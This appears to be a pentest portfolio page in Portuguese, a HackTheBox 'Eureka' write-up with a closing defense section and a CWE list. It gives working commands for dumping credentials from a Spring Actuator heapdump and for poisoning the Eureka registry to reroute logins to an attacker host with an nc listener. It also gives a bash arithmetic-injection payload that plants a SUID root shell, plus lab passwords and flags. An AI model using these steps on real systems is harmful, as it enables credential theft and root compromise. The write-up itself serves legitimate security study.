@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; style-src 'self'; font-src 'self'; img-src 'self' data:; connect-src 'none'; base-uri 'none'; form-action 'none'; object-src 'none'; upgrade-insecure-requests">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="Ezequiel — portfólio de segurança ofensiva.">
+<title>HTB Eureka — Ezequiel</title>
+<link rel="stylesheet" href="../assets/app.css">
+</head>
+<body>
+<header class="topbar"><div class="wrap">
+  <a class="brand" href="../index.html"><span class="p">~/</span>ezequiel<span class="blink">_</span></a>
+  <nav><a href="../index.html#labs">labs</a><a href="../index.html#htb">htb</a><a href="../index.html#thm">thm</a><a href="../index.html#vulnhub">vulnhub</a><a href="../index.html#artigos">artigos</a><a href="../index.html#projetos">projetos</a><a href="../index.html#contato">contato</a></nav>
+</div></header>
+<section class="writeup" id="htb-eureka"><div class="wrap">
+  <a class="back" href="../index.html#htb">← voltar ao portfólio</a>
+  <h1>HackTheBox — Eureka</h1>
+  <div class="meta-row">
+    <span class="plat">HackTheBox · retired</span>
+    <span class="diff critico">DIFÍCIL</span>
+    <span class="tag">Spring Boot Actuator</span><span class="tag">heapdump</span><span class="tag">Eureka registry poisoning</span><span class="tag">MITM</span><span class="tag">bash arithmetic injection</span>
+  </div>
+
+  <div class="wu-sec">
+    <h2>resumo</h2>
+    <p class="u-muted">Máquina Linux (Ubuntu 20.04) rodando um ecossistema de microsserviços Spring Boot: um site "Furni", um Spring Cloud Gateway e um <b>Eureka Server</b> (descoberta de serviços da Netflix) na porta 8761. A cadeia vai de um <code>/actuator/heapdump</code> exposto até root, passando por um ataque MITM via <b>envenenamento do registro de serviços</b> — o ponto mais interessante da box.</p>
+    <pre><code>Actuator heapdump exposto (sem auth)
+        │  credenciais em texto claro na memória da JVM
+        ▼
+SSH oscar190 (foothold)  ──►  config do gateway: rotas por nome lógico (lb://)
+        │
+        ▼
+Envenenamento do registro Eureka  ──►  MITM no /login  ──►  creds de miranda-wise
+        │
+        ▼
+SSH miranda-wise (grupo developers)  ──►  user.txt
+        │
+        ▼
+Injeção em contexto aritmético Bash (cron root)  ──►  bash SUID  ──►  root.txt</code></pre>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 1 — reconhecimento</h2>
+    <pre><code>nmap -Pn -p- --min-rate 1000 -T4 10.129.96.11
+nmap -Pn -sV -sC -p 22,80,8761 10.129.96.11</code></pre>
+    <p class="u-muted">Três portas: <b>22</b> (SSH), <b>80</b> (nginx, redireciona para <code>furni.htb</code>) e <b>8761</b> (Tomcat com HTTP Basic — o <b>Eureka Server</b>, que dá nome à box). Adicionei <code>furni.htb</code> ao <code>/etc/hosts</code>. O site é um e-commerce Spring Boot; os headers (<code>Vary: Origin</code>, <code>X-Frame-Options: DENY</code>) confirmam Spring Security no backend.</p>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 2 — Actuator heapdump → vazamento de credenciais</h2>
+    <p class="u-muted">Enumerando endpoints do Spring Boot Actuator, <b>todos</b> respondiam 200 sem autenticação — sintoma clássico de <code>management.endpoints.web.exposure.include=*</code>.</p>
+    <pre><code>for ep in actuator actuator/health actuator/env actuator/heapdump actuator/beans; do
+  curl -s -o /dev/null -w "$ep -> %{http_code}\n" "http://furni.htb/$ep"
+done
+# actuator/heapdump -> 200</code></pre>
+    <div class="mech">
+      <p><b>Mecanismo:</b> o endpoint <code>/actuator/heapdump</code> despeja <b>toda a memória da JVM</b> (~76&nbsp;MB) para download. Credenciais que o processo carrega em runtime — string de conexão JDBC, usuário/senha do banco, e as credenciais Basic do Eureka — ficam em <b>texto claro</b> nesse dump. Classe: <b>CWE-200</b> (exposição de informação) por configuração insegura do Actuator.</p>
+    </div>
+    <pre><code>curl -s -o heapdump "http://furni.htb/actuator/heapdump"
+strings heapdump | grep -E 'jdbc:mysql|EurekaSrvr|datasource.username' | sort -u</code></pre>
+    <p class="u-muted">Saíram duas credenciais sem precisar de ferramenta especializada:</p>
+    <pre><code>oscar190 : 0sc@r190_S0l!dP@sswd      # app/DB
+EurekaSrvr : 0scarPWDisTheB3st        # Basic auth do Eureka (:8761)</code></pre>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 3 — foothold SSH e a arquitetura do gateway</h2>
+    <pre><code>sshpass -p '0sc@r190_S0l!dP@sswd' ssh oscar190@10.129.96.11 "id; sudo -l"</code></pre>
+    <p class="u-muted">Login OK como <code>oscar190</code> (sem sudo). A <code>user.txt</code> pertence a <b>miranda-wise</b>, não a mim — preciso de um pivô. Inspecionando a config do gateway encontrei o ponto fraco do desenho:</p>
+    <pre><code>cat /var/www/web/cloud-gateway/target/classes/application.yaml
+# routes:
+#   - id: user-management-service
+#     uri: lb://USER-MANAGEMENT-SERVICE     ← nome lógico, não IP
+#     predicates: [ Path=/login,/register ]</code></pre>
+    <div class="mech">
+      <p><b>Mecanismo:</b> o gateway roteia <code>/login</code> para <code>lb://USER-MANAGEMENT-SERVICE</code> — um <b>nome lógico</b>. O IP real é resolvido consultando o Eureka a cada requisição. Ou seja: <b>quem controla o registro Eureka controla para onde o login vai</b>. Com as credenciais do Eureka vazadas na fase 2, dá para sequestrar esse roteamento.</p>
+    </div>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 4 — envenenamento do registro Eureka → MITM → user.txt</h2>
+    <p class="u-muted">A ideia: registrar uma instância falsa apontando para a minha máquina e apagar a real, de forma que o gateway passe a mandar os POSTs de <code>/login</code> para o meu listener.</p>
+    <pre><code># 1) registra instância falsa apontando para o meu host (10.10.15.200:8081)
+curl -s -X POST "http://EurekaSrvr:0scarPWDisTheB3st@10.129.96.11:8761/eureka/apps/USER-MANAGEMENT-SERVICE" \
+  -H 'Content-Type: application/json' -d '{ "instance": { "instanceId":"evil",
+  "hostName":"10.10.15.200","ipAddr":"10.10.15.200","app":"USER-MANAGEMENT-SERVICE",
+  "vipAddress":"USER-MANAGEMENT-SERVICE","status":"UP","port":{"$":8081,"@enabled":"true"},
+  "dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"} } }'
+
+# 2) apaga a instância real — em loop, porque o heartbeat a recria a cada ~20s
+curl -s -X DELETE "http://EurekaSrvr:0scarPWDisTheB3st@10.129.96.11:8761/eureka/apps/USER-MANAGEMENT-SERVICE/localhost:USER-MANAGEMENT-SERVICE:8081"</code></pre>
+    <div class="mech">
+      <p><b>Mecanismo:</b> o Eureka não valida <b>quem</b> registra uma instância nem para qual host ela aponta. Registrando uma instância falsa e deletando a real em loop (a cada 2–3s, para vencer o heartbeat de ~20s que recria a verdadeira), o gateway resolve o nome lógico para o <b>meu</b> IP. Um cron do root simula logins periodicamente, então os POSTs reais caem no meu <code>nc</code>:</p>
+    </div>
+    <pre><code>nc -lvnp 8081
+# POST /login ... username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve
+# URL-decode → miranda.wise@furni.htb : IL!veT0Be&BeT0L0ve</code></pre>
+    <pre><code>sshpass -p 'IL!veT0Be&BeT0L0ve' ssh miranda-wise@10.129.96.11 "id; cat ~/user.txt"
+# groups=...,1003(developers)
+# user.txt: 3094ff0df47671a77a8f94bbd8977733</code></pre>
+    <p class="u-muted">Importante para a próxima fase: <code>miranda-wise</code> pertence ao grupo <b>developers</b>.</p>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 5 — recon de privesc: injeção em contexto aritmético Bash</h2>
+    <pre><code>ls -la /opt/
+# -rwxrwxr-x 1 root root log_analyse.sh   ← root, mas legível/rodado via cron root</code></pre>
+    <p class="u-muted">Um script do root, <code>log_analyse.sh</code>, é executado por cron a cada ~1 min e lê <code>/var/www/web/cloud-gateway/log/application.log</code>. A função vulnerável compara códigos HTTP assim:</p>
+    <pre><code>code=$(echo "$line" | grep -oP 'Status: \K.*')
+if [[ "$existing_code" -eq "$code" ]]; then ... fi</code></pre>
+    <div class="mech">
+      <p><b>Mecanismo (o coração da box):</b> dentro de <code>[[ ... -eq ... ]]</code>, o Bash avalia os dois lados em <b>contexto aritmético</b>. Se <code>$code</code> vem direto do log (entrada externa) e contém uma expressão de índice de array como <code>x[$(comando)]</code>, o Bash <b>executa o comando</b> durante a avaliação aritmética — como root. É <b>CWE-78</b> (command injection) num lugar que a maioria não imagina: uma comparação numérica.</p>
+    </div>
+    <p class="u-muted">Falta controlar o conteúdo do log. O arquivo é <code>www-data</code>, mas o <b>diretório pai</b> é gravável pelo grupo <b>developers</b> — então eu, como miranda-wise, faço backup do log e crio um novo com o mesmo nome, de minha propriedade:</p>
+    <pre><code>ls -la /var/www/web/cloud-gateway/log/
+# drwxrwxr-x www-data developers  ← diretório gravável pelo grupo developers</code></pre>
+  </div>
+
+  <div class="wu-sec">
+    <h2>fase 6 — injeção no cron root → root.txt</h2>
+    <p class="u-muted">Injeto uma linha de log com o payload no formato que a avaliação aritmética executa. Como o próprio gateway reescreve o log continuamente, reinjeto a cada poucos segundos até o cron do root ler na hora certa:</p>
+    <pre><code>while true; do
+  ssh miranda-wise@10.129.96.11 'cd /var/www/web/cloud-gateway/log && \
+    mv application.log application.log.bk 2>/dev/null; \
+    echo "HTTP Status: x[\$(cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash)]" > application.log'
+  sleep 5
+done
+# após ~60s: -rwsrwsrwx 1 root root /tmp/rootbash</code></pre>
+    <pre><code>ssh miranda-wise@10.129.96.11 "/tmp/rootbash -p -c 'id; cat /root/root.txt'"
+# euid=0(root)
+# root.txt: 3620ed3a81837edb608b71e7ed6f0825</code></pre>
+    <p class="u-muted">O <code>-p</code> é essencial: sem ele o bash descarta o euid=0 obtido pelo bit SUID e volta para o uid do miranda-wise.</p>
+  </div>
+
+  <div class="wu-sec">
+    <h2>o que quebraria a cadeia (defesa)</h2>
+    <div class="fix">
+      <ul>
+        <li><b>Actuator:</b> expor só <code>health</code>; nunca <code>heapdump</code>/<code>env</code> publicamente. Restringir a rede de admin + autenticação.</li>
+        <li><b>Eureka:</b> autenticação forte (mTLS) para registro; ACL de quais host/IP podem ser registrados; segredos fora do código, em cofre.</li>
+        <li><b>Script de log:</b> validar que <code>$code</code> é numérico (<code>[[ "$x" =~ ^[0-9]+$ ]]</code>) antes de qualquer comparação aritmética — ou comparar como string.</li>
+        <li><b>Permissões:</b> diretório lido por cron root não deve ser gravável por um grupo amplo como <code>developers</code>.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="wu-sec">
+    <h2>classes (CWE)</h2>
+    <pre><code>CWE-200  Exposição de dados sensíveis   (Actuator heapdump)
+CWE-287  Autenticação imprópria         (registro Eureka sem validação)
+CWE-78   Command injection              (contexto aritmético Bash → root)
+CWE-732  Permissão incorreta            (diretório de log gravável pelo grupo)</code></pre>
+  </div>
+</div></section>
+<footer><div class="wrap">
+  <span class="foot-note">// construído para estudo de pentest · máquina HackTheBox retired</span>
+  <div class="links"><a href="../index.html">topo ↑</a><span class="foot-note">DCPT → eJPT → Security+ → PenTest+ → CPTS → OSCP</span></div>
+</div></footer>
+</body>
+</html>
